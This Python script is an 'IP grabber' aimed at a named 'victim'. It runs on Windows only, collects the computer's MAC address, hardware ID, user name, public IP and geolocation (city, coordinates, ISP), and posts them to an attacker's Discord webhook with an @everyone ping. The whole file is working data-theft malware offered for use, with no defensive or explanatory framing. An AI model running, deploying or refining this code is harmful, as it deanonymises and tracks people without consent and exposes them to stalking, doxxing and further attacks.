import os.path
import re, uuid, requests, socket, subprocess, time
import sys
from datetime import datetime

if os.name != "nt":
    sys.exit()

username = "ENTER_VICTIM_DISCORD_USERNAME"

webh = "ENTER_WEBHOOK_HERE"

ping = True #set to false if you don't want a ping

try:
    request = requests.get('https://google.com', timeout=5)
    pass
except:
    print('          [ERROR] - No internet connection')
    time.sleep(3)
    sys.exit()

mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
pcname = os.path.expanduser("~")[9:]
ip = requests.get('https://api.ipify.org/').text
e = requests.get(f"http://ip-api.com/json/{ip}").json()
x = "xxxxxxxx"

content = ''

if ping == True:
    content = "everyone"
    
embed = {
      "content": content,
      "embeds": [
        {
          "title": "{username} | IP:",
          "description": f"**Location**\n```python\nCountry: {e['country']} |  Region: {e['regionName']} | City: {e['city']} | Lat: {e['lat']} | Lon: {e['lon']} \nISP: {e['isp']}\nORG: {e['org']}\nAS: {e['as']}\nMAC: {mac}\nHWID: {hwid}\n```\n**Info**\n```python\nTikTok Id: {x} | User: {x}\nLikes: {x}| Views: {x}| Shares: {x}\n```\n**Time Started:** \n```python\n{datetime.now().strftime('%H:%M:%S')}\n```",
          "color": 5814783,
          "footer": {
            "text": "IP GRABBER BY Whaxor#9999 | github.com/xtekky",
            "icon_url": "https://toppng.com/uploads/preview/drawn-logo-vans-cool-logos-easy-to-draw-11563244767orfuvwe9u4.png"
          },
          "timestamp": "xxxxxxxxxxxxxx"
        }
      ],
      "attachments": []
    }

requests.post(webh, json=embed)
